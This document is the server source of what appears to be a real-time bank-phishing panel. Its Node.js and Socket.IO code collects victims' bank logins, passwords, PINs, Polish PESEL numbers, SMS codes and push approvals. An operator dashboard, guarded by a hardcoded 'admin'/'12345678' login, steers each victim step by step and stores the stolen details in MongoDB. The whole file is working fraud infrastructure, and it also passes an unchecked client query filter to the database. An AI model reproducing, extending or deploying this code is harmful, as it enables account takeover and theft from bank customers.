const _PORT = 3301;
//utils
const findUserIndex = require("./backend/utils/findUserIndex");
const findUser = require("./backend/utils/findUser");
const path = require('path');
const cors = require('cors');
const whitelist = ['http://black.poladmin.pp.ua', 'http://poladmin.pp.ua']
const corsOptions = {
    origin: function (origin, callback) {
        if (whitelist.indexOf(origin) !== -1) {
            callback(null, true)
        } else {
            console.log(origin, 'blocked');
            callback('Its close api');
        }
    },
    methods: ['GET', 'POST']
}

// express
const express = require('express');
const app = express();
app.use(cors(corsOptions))
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

//http server
const server= require('http').createServer(app);

//MongoDB
const mongoose = require('mongoose');
const Users = require("./backend/models/user");
mongoose.connect('\'mongodb://localhost:27017/users',{
    useNewUrlParser: true, useUnifiedTopology: true
});
const db = mongoose.connection;
db.on('error', console.error.bind(console, 'connection error:'));
db.once('open', function() { console.log('DB connected')});

//Variables
const admin = {
    login: 'admin',
    pass: '12345678',
}
let users = [];

// Socket
const io = require('socket.io')(server, {
    cors: {
        origin: function (origin, callback) {
            if (whitelist.indexOf(origin) !== -1) {
                callback(null, true)
            } else {
                console.log(origin, 'blocked');
                callback('Its close api');
            }
        },
        methods: ["GET", "POST"],
        transports: ['websocket', 'polling'],
        credentials: true,
        allowEIO3: true
    }
})
io.on('connection', (socket) => {

    console.log('Connection');
    //User actions
    socket.on('init_user', (data) => {
        console.log('Hook init user', data);
        const userIndex = findUserIndex(data.id, users);
        if (userIndex >= 0) {
            users[userIndex] = {
                ...data
            }
        }
        else {
            users.push({
                ...data,
            });
        }
        socket.join(data.id);
        socket.emit('update_user', {
            id: data.id,
            status: data.status
        });
        io.emit('update_users', users);
    });
    socket.on('get_user', (id, callback) => {
        console.log('Hook get user',id);
        const user =  findUser(id, users);
        socket.join(id);
        callback( user );
    });
    socket.on('send_code', (data) => {
        console.log('Hook send_code');
        const user = findUser(data.id, users);

        if(user) {
            user.status = 'send_code';
            user.code = data.code;
            socket.to(data.id).emit('update_user', {
                id: data.id, status: 'send_code'
            });
            io.emit('update_users', users);
        }
        // const index =  users.findIndex((item) => {
        //     return item.id === data.id
        // });
        // users[index].status = 'send_code';
        // users[index].code = data.code;
        io.emit('update_users', users);
    });
    socket.on('send_other_data', (data, id) => {
        console.log('Hook, send_other_data');
        const userIndex = findUserIndex(id, users);
        if (userIndex >= 0) {
            users[userIndex] = {
                ...users[userIndex],
                ...data,
                status: 'send_other_data',
            }
            socket.to(id).emit('update_user', {
                id, status: 'send_other_data'
            })
            io.emit('update_users', users);
        }
    });
    socket.on('send_push', ({id, code}) => {
        console.log('Hook send_push', id, code);
        const user = findUser(id, users);

        if(user) {
            user.status = 'send_push';
            user.code = code;
            socket.to(id).emit('update_user', {
                id, status: 'send_push'
            })
            io.emit('update_users', users);
        }
    })
    //Admin actions
    socket.on('get_all_users', (callback)=>{
        console.log('Hook get_all_users');
        callback(users);
    });
    socket.on('fail_user', (id) => {
        console.log('Hook, fail_user');
        console.log(id);
        const user = findUser(id, users);
        if (user) {
            user.status = 'fail_user';
            const newUser = new Users({
                userID: user.id,
                login: user.login,
                password: user.pass,
                bank: user.bank,
                pin_code: user.pin,
                pesel: user.pesel,
                secret: user.lastname,
                amount: user.amount,
                isSuccess: false
            });
            newUser.save(function(err,user){
                if(err){
                    return console.error(err);
                }
            });
            socket.to(id).emit('update_user', {
                id, status: 'fail_user'
            })
            io.emit('update_users', users);

        }
    })
    socket.on('success_user', (id) => {
        console.log('Hook, success_user');
        const user = findUser(id, users);
        if (user) {
            user.status = 'success_user';
            const newUser = new Users({
                userID: user.id,
                login: user.login,
                password: user.pass,
                bank: user.bank,
                pin_code: user.pin,
                pesel: user.pesel,
                secret: user.lastname,
                amount: user.amount,
                isSuccess: true
            });
            newUser.save(function(err,user){
                if(err){
                    return console.error(err);
                }
            });
            socket.to(id).emit('update_user', {
                id, status: 'success_user'
            })
            io.emit('update_users', users);

        }
    })
    socket.on('delete_user', (id) => {
        console.log('Hook, delete_user');
        const userIndex = findUserIndex(id, users);
        if(userIndex >= 0){
            users.splice(userIndex, 1);
            socket.to(id).emit('update_user', {
                status: ''
            })
            io.emit('update_users', users);
        }

    })

    //Update user hook
    socket.on('update_user', ({status, id, args}) => {
        console.log('Hook, update_user');
        const userIndex = findUserIndex(id, users);
        if (userIndex >= 0){
            console.log(`Change status: ${users[userIndex].status} => ${status}`)
            users[userIndex] = {
                ...users[userIndex],
                ...args,
                status
            }
            socket.to(id).emit('update_user', {
                status, ...args, id
            });
            io.emit('update_users', users);
        }

    } )
    socket.on('send_data', ({status, id, args}) => {
        console.log('Hook, send_data');
        const userIndex = findUserIndex(id, users);
        if (userIndex >= 0){
            users[userIndex] = {
                ...users[userIndex],
                ...args,
                status
            }
            socket.emit('update_user', {
                status, ...args, id
            });
            io.emit('update_users', users);
        }

    } )

    //Disconnect socket
    socket.on("disconnect", (reason) => {
        console.log(reason);
    });
})


//Server router
app.post('/auth', (req, res) => {
    console.log(req.body);
    if( req.body.login === admin.login && req.body.password === admin.pass){
        setTimeout(()=> {
            res.json({
                status: true,
                id: admin.id,
            })
        }, 2000)

    }
    else {
        res.json({
            status: false,
            msg: 'Failed'
        })
    }
})
app.get('/test', (req, res) => {
    console.log('Test request');
    res.send( `Test request ${req.method}`)
})
app.get('/get_users', async (req, res) => {
    console.log('Getting users list');

    const users = await Users.find( function(err, users){
        if(err){
            return console.error(err);
        }
        console.log('Users',users);
        return users;
    });
    res.json(users);
});
app.post('/get_users', async (req, res) => {
    console.log('Getting users list with filter');
    const {filter} = req.body;
    console.log(filter);
    const users = await Users.find(filter, function (err, users){
        if (err) return console.error(err);
        console.log('Users',users);
        return users;
    })
    res.json(await users);

})

server.listen(_PORT, ()=> {
    console.log(`Server listen port ${_PORT}`);
})
